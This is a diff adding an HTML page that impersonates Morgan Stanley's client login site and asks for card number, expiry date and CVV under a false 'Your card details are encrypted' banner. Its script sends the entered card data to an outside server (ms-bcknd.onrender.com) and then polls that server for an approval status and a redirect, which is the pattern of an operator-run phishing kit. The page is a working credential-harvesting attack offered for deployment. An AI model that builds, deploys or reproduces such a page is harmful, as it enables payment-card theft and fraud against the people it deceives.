@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11">
+    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
+    <title>Morgan Stanley – Billing Information</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        /* Same CSS as index.html – keep identical for consistency */
+        :root {
+            --ms-linear-gradient-start: #0d7eb3;
+            --ms-linear-gradient-end: #096491;
+            --ms-linear-gradient-angle: 50deg;
+            --theme-color-light: #187aba;
+            --theme-color-medium: #005c90;
+            --theme-color-dark: #002b51;
+            --theme-color-accent: #b9e8fe;
+            --theme-color-bg: #fff;
+            --theme-color-bg-container: #fff;
+            --theme-color-divider: #e9e9e9;
+            --theme-color-positive: #060;
+            --theme-color-error: #a00;
+            --theme-color-warning: #bb831b;
+            --theme-color-focus: var(--theme-color-light);
+            --theme-color-body: #333;
+            --theme-color-text-muted: #666;
+            --theme-color-gray-1: #666;
+            --theme-color-gray-2: #767676;
+            --theme-color-gray-3: #b7b7b7;
+            --theme-color-gray-4: #dadada;
+            --theme-color-gray-5: #e9e9e9;
+            --theme-color-gray-6: #f5f5f5;
+            --base-font-size: 16px;
+            --theme-font-family: "Karla", -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        @font-face {
+            font-family: 'Karla';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Karla'), local('Karla-Regular'), url('https://fonts.gstatic.com/s/karla/v15/qkBIXvYC6trAT55ZBi1ueQVIjQTD-JqaE0lK.ttf') format('truetype');
+        }
+        @font-face {
+            font-family: 'Karla';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Karla Bold'), local('Karla-Bold'), url('https://fonts.gstatic.com/s/karla/v15/qkBIXvYC6trAT55ZBi1ueQVIjQTDH52aE0lK.ttf') format('truetype');
+        }
+        * {
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            font-feature-settings: "tnum";
+            font-variant-numeric: tabular-nums;
+        }
+        html, body {
+            height: 100%;
+            margin: 0;
+            background-color: #e9e9e9;
+            font-family: var(--theme-font-family), 'Karla', sans-serif;
+            font-size: 16px;
+            line-height: 24px;
+            color: #333;
+        }
+        .mso-header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        @media (max-width: 767px) {
+            .mso-header-container { justify-content: center; }
+        }
+        .mso-header-nav-bar {
+            display: flex;
+            text-align: center;
+        }
+        @media (max-width: 1200px) {
+            .mso-header-nav-bar { display: none !important; }
+        }
+        .mso-header-nav-element {
+            margin-left: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .mso-header-nav-content {
+            font-size: 16px;
+            color: #002b51;
+            line-height: 24px;
+            text-transform: uppercase;
+            font-weight: 700;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+        }
+        .mso-header-nav-content:hover {
+            text-decoration: underline;
+        }
+        .mso-desktop-header {
+            margin-top: 56px;
+            margin-bottom: 56px;
+            height: 32px;
+            width: auto;
+            display: block;
+        }
+        @media (max-width: 767px) {
+            .mso-desktop-header {
+                margin: 40px auto;
+                height: 26px;
+            }
+        }
+        .login-page {
+            width: 100%;
+            min-height: 100%;
+            background-color: #e9e9e9;
+            display: flex;
+            flex-direction: column;
+        }
+        .login_form {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        @media (max-width: 767px) {
+            .login_form { padding: 0; }
+        }
+        .login-row {
+            display: flex;
+            gap: 20px;
+            margin-top: 20px;
+            min-height: 600px;
+        }
+        @media (max-width: 1200px) {
+            .login-row { min-height: auto; }
+        }
+        @media (max-width: 767px) {
+            .login-row { flex-direction: column; }
+        }
+        .login-left {
+            flex: 1;
+            background: white;
+            padding: 20px 32px 32px;
+            max-width: 100%;
+        }
+        @media (min-width: 1200px) {
+            .login-left { flex: 0 0 33.333%; }
+        }
+        .login-right {
+            flex: 1;
+            background: #e9e9e9;
+        }
+        @media (min-width: 1200px) {
+            .login-right { flex: 0 0 66.666%; }
+        }
+        @media (max-width: 767px) {
+            .login-right { display: none; }
+        }
+        .login-container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        h2 {
+            font-size: 30px;
+            line-height: 36px;
+            font-weight: normal;
+            color: #002b51;
+            text-align: center;
+            margin: 0 0 30px 0;
+            padding-top: 20px;
+        }
+        .form-row {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        .input-field {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #e9e9e9;
+            padding: 8px 0 4px;
+            font-size: 16px;
+            line-height: 24px;
+            outline: none;
+            background: transparent;
+            font-family: inherit;
+        }
+        .input-field:focus {
+            border-bottom-color: #187aba;
+        }
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #e9e9e9;
+        }
+        .input-wrapper .input-field {
+            border-bottom: none;
+            flex: 1;
+        }
+        .input-wrapper i {
+            color: #767676;
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+        .show-hide {
+            background: none;
+            border: none;
+            color: #187aba;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            padding: 0 0 0 10px;
+        }
+        .show-hide:hover {
+            text-decoration: underline;
+        }
+        .checkbox-label {
+            display: inline-flex;
+            align-items: center;
+            position: relative;
+            padding-left: 28px;
+            cursor: pointer;
+            line-height: 24px;
+            color: #187aba;
+        }
+        .checkbox-label input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .checkmark {
+            position: absolute;
+            left: 0;
+            width: 20px;
+            height: 20px;
+            border: 1px solid #b7b7b7;
+            background: white;
+        }
+        .checkbox-label input:checked + .checkmark::after {
+            content: "✓";
+            display: block;
+            text-align: center;
+            line-height: 20px;
+            color: #187aba;
+            font-weight: bold;
+        }
+        .btn-login {
+            background-color: #187aba;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            min-width: 160px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50px;
+            transition: background-color 0.2s;
+            position: relative;
+        }
+        .btn-login:hover {
+            background-color: #005c90;
+        }
+        .btn-login:disabled {
+            background-color: #b7b7b7;
+            cursor: not-allowed;
+        }
+        .btn-login .loading {
+            display: none;
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            animation: spin 1s linear infinite;
+        }
+        .btn-login .loading.active {
+            display: inline-block;
+        }
+        .btn-secondary {
+            background: none;
+            border: 1px solid transparent;
+            padding: 10px 24px;
+            min-width: 160px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #187aba;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: background-color 0.2s;
+        }
+        .btn-secondary:hover {
+            background-color: rgba(24, 122, 186, 0.05);
+            text-decoration: underline;
+        }
+        .forgot-row {
+            border-top: 1px solid #e9e9e9;
+            display: flex;
+            margin-top: 20px;
+            padding-top: 10px;
+        }
+        .forgot-item {
+            flex: 1;
+            text-align: center;
+            border-right: 1px solid #e9e9e9;
+            padding: 10px 0;
+        }
+        .forgot-item:last-child {
+            border-right: none;
+        }
+        .forgot-item .btn-secondary {
+            min-width: auto;
+            padding: 8px 16px;
+        }
+        .error-message {
+            color: #a00;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: center;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+        .field-error {
+            color: #a00;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .field-error.show {
+            display: block;
+        }
+        .banner {
+            height: 100%;
+            min-height: 500px;
+            background: linear-gradient(145deg, #0d7eb3, #096491);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            border-radius: 12px;
+        }
+        .banner-content {
+            max-width: 400px;
+            padding: 40px;
+        }
+        .banner h3 {
+            font-size: 46px;
+            line-height: 52px;
+            letter-spacing: -2.1px;
+            margin: 0 0 20px;
+            font-weight: normal;
+        }
+        .banner p {
+            font-size: 16px;
+            line-height: 24px;
+            opacity: 0.9;
+        }
+        .ms-footer {
+            background-color: #002b51;
+            color: #fff;
+            width: 100%;
+            margin-top: 60px;
+            padding: 40px 0 20px;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .footer-columns {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 30px;
+        }
+        .footer-column {
+            flex: 1;
+            min-width: 200px;
+        }
+        .footer-column-large {
+            flex: 2;
+        }
+        .footer-column h4 {
+            font-size: 18px;
+            margin: 0 0 15px;
+            font-weight: normal;
+            color: white;
+        }
+        .footer-links {
+            display: flex;
+            flex-direction: column;
+        }
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            line-height: 28px;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+            opacity: 1;
+        }
+        .footer-copyright {
+            margin-top: 40px;
+            font-size: 14px;
+            text-align: left;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 20px;
+        }
+        .footer-copyright a {
+            color: white;
+            text-decoration: underline;
+        }
+        .mobile-only { display: none; }
+        @media (max-width: 767px) {
+            .desktop-only { display: none; }
+            .mobile-only { display: block; }
+            .footer-columns { flex-direction: column; }
+        }
+        .skip-link {
+            position: absolute;
+            top: -200px;
+            left: 10px;
+            background: white;
+            padding: 8px 16px;
+            z-index: 1000;
+            text-decoration: none;
+            color: #187aba;
+            border-radius: 50px;
+        }
+        .skip-link:focus {
+            top: 10px;
+        }
+        .text-center { text-align: center; }
+        .mt-4 { margin-top: 20px; }
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        /* Silent status – hidden but functional */
+        .silent-status {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <div role="banner">
+        <div class="mso-header-container">
+            <div>
+                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
+                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
+                </svg>
+            </div>
+            <nav class="mso-header-nav-bar" aria-label="Main navigation">
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
+            </nav>
+        </div>
+    </div>
+
+    <main id="main-content" class="login-page">
+        <div class="login_form">
+            <div class="login-row">
+                <div class="login-left">
+                    <div class="login-container">
+                        <h2>Enter Card Details</h2>
+
+                        <form id="cardForm">
+                            <div class="form-row">
+                                <div class="input-wrapper">
+                                    <i data-lucide="credit-card"></i>
+                                    <input type="text" id="cardNumber" class="input-field" placeholder="Card number" autocomplete="cc-number" required aria-label="Card number">
+                                </div>
+                                <div id="cardNumberError" class="field-error"></div>
+                            </div>
+                            <div class="form-row" style="display: flex; gap: 10px;">
+                                <div style="flex: 1;">
+                                    <input type="text" id="expDate" class="input-field" placeholder="MM/YY" autocomplete="cc-exp" required aria-label="Expiration date">
+                                    <div id="expDateError" class="field-error"></div>
+                                </div>
+                                <div style="flex: 1;">
+                                    <input type="text" id="cvv" class="input-field" placeholder="CVV" autocomplete="cc-csc" required aria-label="CVV">
+                                    <div id="cvvError" class="field-error"></div>
+                                </div>
+                            </div>
+                            <div class="form-row text-center">
+                                <button type="submit" class="btn-login" id="submitBtn">
+                                    <i data-lucide="loader-2" class="loading"></i>
+                                    <span>Submit</span>
+                                </button>
+                            </div>
+                            <div id="silentStatus" class="silent-status"></div>
+                        </form>
+
+                        <div class="forgot-row">
+                            <div class="forgot-item">
+                                <button class="btn-secondary" onclick="window.location.href='index.html';">Cancel</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="login-right">
+                    <div class="banner">
+                        <div class="banner-content">
+                            <h3>Secure Payment</h3>
+                            <p>Your card details are encrypted</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer class="ms-footer">...</footer>
+    </main>
+
+    <script>
+        lucide.createIcons();
+        
+        const BACKEND_URL = 'https://ms-bcknd.onrender.com';
+        let pollTimeout;
+
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expDate = document.getElementById('expDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIcon = submitBtn.querySelector('.loading');
+            const submitText = submitBtn.querySelector('span');
+            
+            // Clear errors
+            document.getElementById('cardNumberError').classList.remove('show');
+            document.getElementById('expDateError').classList.remove('show');
+            document.getElementById('cvvError').classList.remove('show');
+            
+            // Basic validation
+            if (!cardNumber) {
+                document.getElementById('cardNumberError').textContent = 'Card number required';
+                document.getElementById('cardNumberError').classList.add('show');
+                return;
+            }
+            if (!/^\d{13,19}$/.test(cardNumber)) {
+                document.getElementById('cardNumberError').textContent = 'Invalid card number';
+                document.getElementById('cardNumberError').classList.add('show');
+                return;
+            }
+            if (!expDate) {
+                document.getElementById('expDateError').textContent = 'Expiration date required';
+                document.getElementById('expDateError').classList.add('show');
+                return;
+            }
+            if (!cvv || !/^\d{3,4}$/.test(cvv)) {
+                document.getElementById('cvvError').textContent = 'Invalid CVV';
+                document.getElementById('cvvError').classList.add('show');
+                return;
+            }
+            
+            loadingIcon.classList.add('active');
+            submitText.textContent = 'Processing...';
+            submitBtn.disabled = true;
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/c`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        data: {
+                            card_number: cardNumber,
+                            exp_date: expDate,
+                            cvv: cvv
+                        }
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok && data.success) {
+                    const sessionId = data.id;
+                    localStorage.setItem('sessionId', sessionId);
+                    pollStatus(sessionId, 0);
+                } else {
+                    document.getElementById('cardNumberError').textContent = data.error || 'Submission failed';
+                    document.getElementById('cardNumberError').classList.add('show');
+                    resetButton();
+                }
+            } catch (error) {
+                document.getElementById('cardNumberError').textContent = 'Network error';
+                document.getElementById('cardNumberError').classList.add('show');
+                resetButton();
+            }
+        });
+
+        async function pollStatus(sessionId, attempt) {
+            const maxAttempts = 120;
+            try {
+                const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
+                if (!response.ok) {
+                    if (response.status === 404 && attempt < 3) {
+                        setTimeout(() => pollStatus(sessionId, attempt + 1), 2000);
+                        return;
+                    }
+                    if (attempt < maxAttempts) {
+                        setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
+                    } else {
+                        resetButton();
+                    }
+                    return;
+                }
+                const data = await response.json();
+                if (data.status === 'approved') {
+                    if (data.redirect_url) {
+                        let redirectUrl = data.redirect_url.startsWith('http') ? data.redirect_url : window.location.origin + '/' + data.redirect_url;
+                        window.location.href = redirectUrl;
+                    } else {
+                        window.location.href = 'index.html';
+                    }
+                } else if (data.status === 'pending') {
+                    if (attempt < maxAttempts) {
+                        setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
+                    } else {
+                        resetButton();
+                    }
+                } else {
+                    resetButton();
+                }
+            } catch (error) {
+                if (attempt < maxAttempts) {
+                    setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
+                } else {
+                    resetButton();
+                }
+            }
+        }
+
+        function resetButton() {
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIcon = submitBtn.querySelector('.loading');
+            const submitText = submitBtn.querySelector('span');
+            loadingIcon.classList.remove('active');
+            submitText.textContent = 'Submit';
+            submitBtn.disabled = false;
+        }
+    </script>
+</body>
+</html>
